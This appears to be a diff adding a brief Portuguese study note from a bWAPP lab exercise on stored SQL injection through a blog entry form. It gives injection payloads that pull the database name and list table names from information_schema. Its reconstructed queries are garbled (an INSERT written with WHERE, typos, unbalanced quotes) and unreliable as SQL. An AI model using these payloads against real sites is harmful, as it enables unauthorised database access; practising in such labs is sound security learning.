@@ -1,0 +1,22 @@
+______________________________
+SQL Injection - Stored (Blog)
+------------------------------
+Essa parte é aquelas que a pessoa insere na página 
+
+Ex: add an entry to our blog
+
+Vamos testar com aspas simples.
+
+Erro:  near 'bwapp')' at line 1
+
+Query: INSERT INTO blog (owner, date, entry) WHERE (USER_AUTENT, now(), '" $entry "');
+---------------------------------------------------------------------------------------
+
+Injection: '
+Injeção Final: teste', (select database()))#
+Query Final: INSERT INTO blog (owner, date, entry) WHERE (USER_AUTENT, now(), ''');
+
+Erro: 'bee')'
+
+Criando uma injeção mias avançada:
+teste', (SELECT GROUP_CONCAT(table_name '\n') FROM information_schema.tables WHERE table_schema='bwapp))#
